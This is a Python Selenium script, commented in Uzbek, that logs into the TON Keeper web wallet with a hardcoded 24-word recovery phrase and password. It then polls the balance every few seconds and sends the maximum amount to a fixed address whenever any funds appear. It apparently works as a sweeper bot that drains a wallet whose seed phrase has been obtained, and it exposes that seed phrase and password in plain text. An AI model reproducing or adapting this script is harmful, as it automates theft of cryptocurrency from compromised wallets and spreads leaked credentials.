from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

# Chrome driver uchun brauzer instance yaratamiz
driver = webdriver.Chrome()

try:
    # TON Keeper saytiga kiramiz
    driver.get("https://wallet.tonkeeper.com/")

    # Sahifa to'liq yuklanishini kutamiz
    wait = WebDriverWait(driver, 20)

    # Mavjud walletga kirish jarayonlarini bajarish
    get_started_button = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Get started')]")))
    get_started_button.click()

    existing_wallet_button = wait.until(EC.element_to_be_clickable((By.XPATH, "//span[text()='Existing Wallet']/ancestor::button")))
    existing_wallet_button.click()

    inputs = wait.until(EC.presence_of_all_elements_located((By.XPATH, "//input[contains(@class, 'sc-leCVXs') and contains(@class, 'livCdq')]")))

    mnemonic_words = [
        "vacant", "piece", "tell", "size", "fantasy", "book", "clean",
        "casino", "general", "inmate", "erosion", "never", "truth",
        "outer", "nest", "quantum", "crazy", "crush", "side", "convince",
        "lunch", "park", "fruit", "turkey"
    ]
    
    for i in range(min(len(inputs), len(mnemonic_words))):
        inputs[i].send_keys(mnemonic_words[i])
        time.sleep(0.2)

    continue_button_1 = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Continue')]")))
    continue_button_1.click()

    continue_button_2 = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Continue')]")))
    continue_button_2.click()

    password_input = wait.until(EC.presence_of_element_located((By.XPATH, "//input[@id='create-password']")))
    password_input.send_keys("Lalaku007")
    time.sleep(0.2)

    password2_input = wait.until(EC.presence_of_element_located((By.XPATH, "//input[@id='create-password-confirm']")))
    password2_input.send_keys("Lalaku007")

    continue_button_3 = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Continue')]")))
    continue_button_3.click()

    save_button = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Save')]")))
    save_button.click()

    print("Walletga muvaffaqiyatli kirdik!")

    # Qiymatni tekshirib turuvchi loop
    while True:
        try:
            # Qiymatni o'qib olish
            ton_value_element = wait.until(EC.presence_of_element_located((By.XPATH, "//div[@class='sc-RXieO hbKeZp']//span[@class='sc-jSguLX egBbuV']")))
            ton_value = ton_value_element.text.replace(",", ".")  # Qiymatni float uchun mos formatga o'zgartiramiz

            ton_value_float = float(ton_value)
            print(f"Hozirgi qiymat: {ton_value_float}")

            # Agar qiymat katta bo'lsa, Send tugmasini bosish
            if ton_value_float > 0.0001:
                print("Qiymat 0.0001 dan katta. 'Send' tugmasi bosilmoqda...")
                send_button = driver.find_element(By.XPATH, "//button[contains(@class, 'sc-bXDltw') and contains(., 'Send')]")
                driver.execute_script("arguments[0].click();", send_button)

                textarea = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.TAG_NAME, "textarea"))
                )
                textarea.send_keys('UQBjnfy1nGfJFZchNUj7hHEWy1hi-nEvm0CZvP2oNRv5dOF8')

                # 1 soniya kutish (kiritilgan matnni tekshirish uchun)
                time.sleep(1)

                # `Continue` tugmasini topish va bosish
                continue_button = driver.find_element(By.XPATH, "//button[text()='Continue']")

                # Tugmani bosish
                continue_button.click()

                max_span = driver.find_element(By.XPATH, "//span[text()='MAX']")
                driver.execute_script("arguments[0].click();", max_span)

                # `Continue` tugmasini topish va bosish
                continue_button = driver.find_element(By.XPATH, "//button[text()='Continue']")

                # Tugmani bosish
                continue_button.click()
                time.sleep(3)

                confirm_button = driver.find_element(By.XPATH, "//button[text()='Confirm and Send']")
                confirm_button.click()
                time.sleep(3)                

                password_input = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.ID, "unlock-password"))
                )
                password_input.send_keys("Lalaku007")

                # 'Confirm' tugmasini matni orqali kutish va tanlash
                confirm_button = WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable((By.XPATH, "//button[text()='Confirm']"))
                )

                # 'Confirm' tugmasini bosish
                confirm_button.click()

            else:
                print("Qiymat 0.0001 dan kichik.")

        except Exception as e:
            print(f"Xatolik yuz berdi: {e}")
        
        driver.refresh()
        time.sleep(3)  # Har 3 soniyada tekshiruvni takrorlash

except Exception as e:
    print(f"Xatolik yuz berdi: {e}")

finally:
    driver.quit()
